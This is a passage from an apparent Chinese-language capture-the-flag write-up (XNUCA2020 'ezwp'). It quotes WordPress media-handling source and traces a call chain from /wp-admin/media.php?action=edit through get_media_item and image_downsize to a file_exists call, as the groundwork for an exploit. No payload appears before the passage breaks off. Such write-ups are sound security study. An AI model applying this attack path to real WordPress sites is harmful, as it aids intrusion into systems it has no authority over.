class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// wp-includes/media.php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Scale an image to fit a particular size (such as &#x27;thumb&#x27; or &#x27;medium&#x27;).</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The URL might be the original image, or it might be a resized version. This</span></span><br><span class="line"><span class="comment"> * function won&#x27;t create a new resized copy, it will just return an already</span></span><br><span class="line"><span class="comment"> * resized one if it exists.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * A plugin may use the &#123;<span class="doctag">@see</span> &#x27;image_downsize&#x27;&#125; filter to hook into and offer image</span></span><br><span class="line"><span class="comment"> * resizing services for images. The hook must return an array with the same</span></span><br><span class="line"><span class="comment"> * elements that are normally returned from the function.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2.5.0</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> int          $id   Attachment ID for image.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string|int[] $size Optional. Image size to scale to. Accepts any valid image size name,</span></span><br><span class="line"><span class="comment"> *                           or an array of width and height values in pixels (in that order).</span></span><br><span class="line"><span class="comment"> *                           Default &#x27;medium&#x27;.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> array|false &#123;</span></span><br><span class="line"><span class="comment"> *     Array of image data, or boolean false if no image is available.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *     <span class="doctag">@type</span> string $0 Image source URL.</span></span><br><span class="line"><span class="comment"> *     <span class="doctag">@type</span> int    $1 Image width in pixels.</span></span><br><span class="line"><span class="comment"> *     <span class="doctag">@type</span> int    $2 Image height in pixels.</span></span><br><span class="line"><span class="comment"> *     <span class="doctag">@type</span> bool   $3 Whether the image is a resized image.</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">image_downsize</span>(<span class="params"> <span class="variable">$id</span>, <span class="variable">$size</span> = <span class="string">&#x27;medium&#x27;</span> </span>) </span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$intermediate</span> ) &#123;</span><br><span class="line">        <span class="variable">$img_url</span>         = <span class="title function_ invoke__">str_replace</span>(<span class="variable">$img_url_basename</span>, <span class="variable">$intermediate</span>[<span class="string">&#x27;file&#x27;</span>], <span class="variable">$img_url</span> );</span><br><span class="line">        <span class="variable">$width</span>           = <span class="variable">$intermediate</span>[<span class="string">&#x27;width&#x27;</span>];</span><br><span class="line">        <span class="variable">$height</span>          = <span class="variable">$intermediate</span>[<span class="string">&#x27;height&#x27;</span>];</span><br><span class="line">        <span class="variable">$is_intermediate</span> = <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (<span class="string">&#x27;thumbnail&#x27;</span> === <span class="variable">$size</span> ) &#123;</span><br><span class="line">        <span class="comment">// Fall back to the old thumbnail.</span></span><br><span class="line">        <span class="variable">$thumb_file</span> = <span class="title function_ invoke__">wp_get_attachment_thumb_file</span>(<span class="variable">$id</span> );</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>image_downsize 函数的作用就是将一个附件转换为不同尺寸的缩略图，如果 size 是 thumbnail 的话就可以直接调用 wp_get_attachment_thumb_file，那么再看有没有什么地方调用了 image_downsize 函数，并且 size 是 thumbnail。由于 WordPress 的媒体页面中可以很明显看到提供了多种尺寸的附件缩略图，所以肯定可以找到满足要求的调用点。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// wp-admin/includes/media.php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Retrieve HTML for the size radio buttons with the specified one checked.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2.7.0</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> WP_Post     $post</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> bool|string $check</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">image_size_input_fields</span>(<span class="params"> <span class="variable">$post</span>, <span class="variable">$check</span> = <span class="string">&#x27;&#x27;</span> </span>) </span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="variable">$size_names</span> = <span class="title function_ invoke__">apply_filters</span>(</span><br><span class="line">        <span class="string">&#x27;image_size_names_choose&#x27;</span>,</span><br><span class="line">        <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;thumbnail&#x27;</span> =&gt; <span class="title function_ invoke__">__</span>(<span class="string">&#x27;Thumbnail&#x27;</span> ),</span><br><span class="line">            <span class="string">&#x27;medium&#x27;</span>    =&gt; <span class="title function_ invoke__">__</span>(<span class="string">&#x27;Medium&#x27;</span> ),</span><br><span class="line">            <span class="string">&#x27;large&#x27;</span>     =&gt; <span class="title function_ invoke__">__</span>(<span class="string">&#x27;Large&#x27;</span> ),</span><br><span class="line">            <span class="string">&#x27;full&#x27;</span>      =&gt; <span class="title function_ invoke__">__</span>(<span class="string">&#x27;Full Size&#x27;</span> ),</span><br><span class="line">        )</span><br><span class="line">    );</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$size_names</span> <span class="keyword">as</span> <span class="variable">$size</span> =&gt; <span class="variable">$label</span> ) &#123;</span><br><span class="line">        <span class="variable">$downsize</span> = <span class="title function_ invoke__">image_downsize</span>(<span class="variable">$post</span>-&gt;ID, <span class="variable">$size</span> );</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="variable">$html</span> = <span class="string">&quot;&lt;div class=&#x27;image-size-item&#x27;&gt;&lt;input type=&#x27;radio&#x27; &quot;</span> . <span class="title function_ invoke__">disabled</span>(<span class="variable">$enabled</span>, <span class="literal">false</span>, <span class="literal">false</span> ) . <span class="string">&quot;name=&#x27;attachments[<span class="subst">$post</span>-&gt;ID][image-size]&#x27; id=&#x27;<span class="subst">&#123;$css_id&#125;</span>&#x27; value=&#x27;<span class="subst">&#123;$size&#125;</span>&#x27;<span class="subst">$checked</span> /&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$html</span> .= <span class="string">&quot;&lt;label for=&#x27;<span class="subst">&#123;$css_id&#125;</span>&#x27;&gt;<span class="subst">$label</span>&lt;/label&gt;&quot;</span>;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;label&#x27;</span> =&gt; <span class="title function_ invoke__">__</span>(<span class="string">&#x27;Size&#x27;</span> ),</span><br><span class="line">        <span class="string">&#x27;input&#x27;</span> =&gt; <span class="string">&#x27;html&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;html&#x27;</span>  =&gt; <span class="title function_ invoke__">join</span>(<span class="string">&quot;\n&quot;</span>, <span class="variable">$out</span> ),</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到在 foreach 中对每一个 size 进行遍历，而 size_names 中刚好有 thumbnail，可以成功触发 image_downsize。通过分析函数，可以看到该函数的作用是构造 HTML 表单，那么很幸运，即然这个函数要输出 HTML，可以通过接口调用该函数的可能性就更大了，再找一找哪里可以触发该函数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// wp-admin/includes/media.php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Retrieves the attachment fields to edit form fields.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2.5.0</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> WP_Post $post</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> array   $errors</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_attachment_fields_to_edit</span>(<span class="params"> <span class="variable">$post</span>, <span class="variable">$errors</span> = <span class="literal">null</span> </span>) </span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="comment">// This was formerly in image_attachment_fields_to_edit().</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&#x27;image&#x27;</span> === <span class="title function_ invoke__">substr</span>(<span class="variable">$post</span>-&gt;post_mime_type, <span class="number">0</span>, <span class="number">5</span> ) ) &#123;</span><br><span class="line">        <span class="variable">$alt</span> = <span class="title function_ invoke__">get_post_meta</span>(<span class="variable">$post</span>-&gt;ID, <span class="string">&#x27;_wp_attachment_image_alt&#x27;</span>, <span class="literal">true</span> );</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$alt</span> ) ) &#123;</span><br><span class="line">            <span class="variable">$alt</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$form_fields</span>[<span class="string">&#x27;post_title&#x27;</span>][<span class="string">&#x27;required&#x27;</span>] = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$form_fields</span>[<span class="string">&#x27;image_alt&#x27;</span>] = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;value&#x27;</span> =&gt; <span class="variable">$alt</span>,</span><br><span class="line">            <span class="string">&#x27;label&#x27;</span> =&gt; <span class="title function_ invoke__">__</span>(<span class="string">&#x27;Alternative Text&#x27;</span> ),</span><br><span class="line">            <span class="string">&#x27;helps&#x27;</span> =&gt; <span class="title function_ invoke__">__</span>(<span class="string">&#x27;Alt text for the image, e.g. &amp;#8220;The Mona Lisa&amp;#8221;&#x27;</span> ),</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="variable">$form_fields</span>[<span class="string">&#x27;align&#x27;</span>] = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;label&#x27;</span> =&gt; <span class="title function_ invoke__">__</span>(<span class="string">&#x27;Alignment&#x27;</span> ),</span><br><span class="line">            <span class="string">&#x27;input&#x27;</span> =&gt; <span class="string">&#x27;html&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;html&#x27;</span>  =&gt; <span class="title function_ invoke__">image_align_input_fields</span>(<span class="variable">$post</span>, <span class="title function_ invoke__">get_option</span>(<span class="string">&#x27;image_default_align&#x27;</span> ) ),</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="variable">$form_fields</span>[<span class="string">&#x27;image-size&#x27;</span>] = <span class="title function_ invoke__">image_size_input_fields</span>(<span class="variable">$post</span>, <span class="title function_ invoke__">get_option</span>(<span class="string">&#x27;image_default_size&#x27;</span>, <span class="string">&#x27;medium&#x27;</span> ) );</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$form_fields</span>[<span class="string">&#x27;image_alt&#x27;</span>] );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Filters the attachment fields to edit.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@since</span> 2.5.0</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array   $form_fields An array of attachment form fields.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> WP_Post $post        The WP_Post attachment object.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="variable">$form_fields</span> = <span class="title function_ invoke__">apply_filters</span>(<span class="string">&#x27;attachment_fields_to_edit&#x27;</span>, <span class="variable">$form_fields</span>, <span class="variable">$post</span> );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$form_fields</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到第 35 行 <code>$form_fields[&#39;image-size&#39;] = image_size_input_fields($post, get_option( &#39;image_default_size&#39;, &#39;medium&#39;) );</code> 调用了该函数，而进入该 if 分支的条件是<code>&#39;image&#39; === substr($post-&gt;post_mime_type, 0, 5)</code>，只要我们上传的文件 mime 是 image 就可以进入分支，那么再找找哪里调用了 get_attachment_fields_to_edit。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// wp-admin/includes/media.php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Retrieve HTML form for modifying the image attachment.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2.5.0</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@global</span> string $redir_tab</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> int          $attachment_id Attachment ID for modification.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string|array $args          Optional. Override defaults.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> string HTML form for attachment.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_media_item</span>(<span class="params"> <span class="variable">$attachment_id</span>, <span class="variable">$args</span> = <span class="literal">null</span> </span>) </span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="variable">$post_mime_types</span> = <span class="title function_ invoke__">get_post_mime_types</span>();</span><br><span class="line">    <span class="variable">$keys</span>            = <span class="title function_ invoke__">array_keys</span>(<span class="title function_ invoke__">wp_match_mime_types</span>(<span class="title function_ invoke__">array_keys</span>(<span class="variable">$post_mime_types</span> ), <span class="variable">$post</span>-&gt;post_mime_type ) );</span><br><span class="line">    <span class="variable">$type</span>            = <span class="title function_ invoke__">reset</span>(<span class="variable">$keys</span> );</span><br><span class="line">    <span class="variable">$type_html</span>       = <span class="string">&quot;&lt;input type=&#x27;hidden&#x27; id=&#x27;type-of-<span class="subst">$attachment_id</span>&#x27; value=&#x27;&quot;</span> . <span class="title function_ invoke__">esc_attr</span>(<span class="variable">$type</span> ) . <span class="string">&quot;&#x27; /&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$form_fields</span> = <span class="title function_ invoke__">get_attachment_fields_to_edit</span>(<span class="variable">$post</span>, <span class="variable">$parsed_args</span>[<span class="string">&#x27;errors&#x27;</span>] );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$parsed_args</span>[<span class="string">&#x27;toggle&#x27;</span>] ) &#123;</span><br><span class="line">        <span class="variable">$class</span>        = <span class="keyword">empty</span>(<span class="variable">$parsed_args</span>[<span class="string">&#x27;errors&#x27;</span>] ) ? <span class="string">&#x27;startclosed&#x27;</span> : <span class="string">&#x27;startopen&#x27;</span>;</span><br><span class="line">        <span class="variable">$toggle_links</span> = <span class="string">&quot;</span></span><br><span class="line"><span class="string">        &lt;a class=&#x27;toggle describe-toggle-on&#x27; href=&#x27;#&#x27;&gt;<span class="subst">$toggle_on</span>&lt;/a&gt;</span></span><br><span class="line"><span class="string">        &lt;a class=&#x27;toggle describe-toggle-off&#x27; href=&#x27;#&#x27;&gt;<span class="subst">$toggle_off</span>&lt;/a&gt;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$class</span>        = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable">$toggle_links</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="variable">$item</span> .= <span class="string">&quot;\t&lt;/tbody&gt;\n&quot;</span>;</span><br><span class="line">    <span class="variable">$item</span> .= <span class="string">&quot;\t&lt;/table&gt;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$hidden_fields</span> <span class="keyword">as</span> <span class="variable">$name</span> =&gt; <span class="variable">$value</span> ) &#123;</span><br><span class="line">        <span class="variable">$item</span> .= <span class="string">&quot;\t&lt;input type=&#x27;hidden&#x27; name=&#x27;<span class="subst">$name</span>&#x27; id=&#x27;<span class="subst">$name</span>&#x27; value=&#x27;&quot;</span> . <span class="title function_ invoke__">esc_attr</span>(<span class="variable">$value</span> ) . <span class="string">&quot;&#x27; /&gt;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$post</span>-&gt;post_parent &lt; <span class="number">1</span> &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;post_id&#x27;</span>] ) ) &#123;</span><br><span class="line">        <span class="variable">$parent</span>      = (<span class="keyword">int</span>) <span class="variable">$_REQUEST</span>[<span class="string">&#x27;post_id&#x27;</span>];</span><br><span class="line">        <span class="variable">$parent_name</span> = <span class="string">&quot;attachments[<span class="subst">$attachment_id</span>][post_parent]&quot;</span>;</span><br><span class="line">        <span class="variable">$item</span>       .= <span class="string">&quot;\t&lt;input type=&#x27;hidden&#x27; name=&#x27;<span class="subst">$parent_name</span>&#x27; id=&#x27;<span class="subst">$parent_name</span>&#x27; value=&#x27;<span class="subst">$parent</span>&#x27; /&gt;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$item</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这是一个非常大的函数，该函数的作用就是构造 HTML 输出页面，其中刚好包含了构造表单的函数。那么再看哪里可以触发 get_media_item。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// wp-admin/media.php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Media management action handler.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@package</span> WordPress</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@subpackage</span> Administration</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/** Load WordPress Administration Bootstrap */</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="keyword">__DIR__</span> . <span class="string">&#x27;/admin.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$parent_file</span>  = <span class="string">&#x27;upload.php&#x27;</span>;</span><br><span class="line"><span class="variable">$submenu_file</span> = <span class="string">&#x27;upload.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">wp_reset_vars</span>(<span class="keyword">array</span>(<span class="string">&#x27;action&#x27;</span> ) );</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$action</span> ) &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="comment">// No break.</span></span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;edit&#x27;</span>:</span><br><span class="line">        <span class="variable">$title</span> = <span class="title function_ invoke__">__</span>(<span class="string">&#x27;Edit Media&#x27;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$errors</span> ) ) &#123;</span><br><span class="line">            <span class="variable">$errors</span> = <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;attachment_id&#x27;</span>] ) ) &#123;</span><br><span class="line">            <span class="title function_ invoke__">wp_redirect</span>(<span class="title function_ invoke__">admin_url</span>(<span class="string">&#x27;upload.php&#x27;</span> ) );</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$att_id</span> = (<span class="keyword">int</span>) <span class="variable">$_GET</span>[<span class="string">&#x27;attachment_id&#x27;</span>];</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">        &lt;form method=<span class="string">&quot;post&quot;</span> <span class="class"><span class="keyword">class</span>=&quot;<span class="title">media</span>-<span class="title">upload</span>-<span class="title">form</span>&quot; <span class="title">id</span>=&quot;<span class="title">media</span>-<span class="title">single</span>-<span class="title">form</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">p</span> <span class="title">class</span>=&quot;<span class="title">submit</span>&quot; <span class="title">style</span>=&quot;<span class="title">padding</span>-<span class="title">bottom</span>: 0;&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;?<span class="title">php</span> <span class="title">submit_button</span>(<span class="title">__</span>(&#x27;<span class="title">Update</span> <span class="title">Media</span>&#x27; ), &#x27;<span class="title">primary</span>&#x27;, &#x27;<span class="title">save</span>&#x27;, <span class="title">false</span> ); ?&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">media</span>-<span class="title">single</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">div</span> <span class="title">id</span>=&quot;<span class="title">media</span>-<span class="title">item</span>-&lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">att_id</span>; ?&gt;&quot; <span class="title">class</span>=&quot;<span class="title">media</span>-<span class="title">item</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">        <span class="title">echo</span> <span class="title">get_media_item</span>(</span></span><br><span class="line"><span class="class">            $<span class="title">att_id</span>,</span></span><br><span class="line"><span class="class">            <span class="title">array</span>(</span></span><br><span class="line"><span class="class">                &#x27;<span class="title">toggle</span>&#x27;     =&gt; <span class="title">false</span>,</span></span><br><span class="line"><span class="class">                &#x27;<span class="title">send</span>&#x27;       =&gt; <span class="title">false</span>,</span></span><br><span class="line"><span class="class">                &#x27;<span class="title">delete</span>&#x27;     =&gt; <span class="title">false</span>,</span></span><br><span class="line"><span class="class">                &#x27;<span class="title">show_title</span>&#x27; =&gt; <span class="title">false</span>,</span></span><br><span class="line"><span class="class">                &#x27;<span class="title">errors</span>&#x27;     =&gt; ! <span class="title">empty</span>($<span class="title">errors</span>[$<span class="title">att_id</span> ] ) ? $<span class="title">errors</span>[$<span class="title">att_id</span> ] : <span class="title">null</span>,</span></span><br><span class="line"><span class="class">            )</span></span><br><span class="line"><span class="class">        );</span></span><br><span class="line"><span class="class">        ?&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">     // ...</span></span><br><span class="line"><span class="class">&#125;</span></span><br></pre></td></tr></table></figure><p>到了这里，已经进入了一个前端页面中，代表我们可以直接访问了，访问地址为”/wp-admin/media.php”。可以看到在一个前端输出中调用了 get_media_item，该输出位于一个 case 中，条件为 action 参数是 edit，并且需要一个合法的 attachment_id 参数，如下图所示。需要注意的是该利用链中的所有的 id（包括 attachment_id 或者 post_id 等等）均指上传的附件 id。</p><p><img src="/2020/12/10/XNUCA2020-ezwp-Writeup/1.png"></p><p>测试一下该利用链是否可以跳转到 file_exists 函数，手动 patch 一下源码，加了一个 die，之所以加在 if 的前面是因为还没有设置 imagedata。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// wp-includes/post.php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="variable">$imagedata</span> = <span class="title function_ invoke__">wp_get_attachment_metadata</span>(<span class="variable">$post</span>-&gt;ID );</span><br><span class="line"><span class="keyword">if</span> (! <span class="title function_ 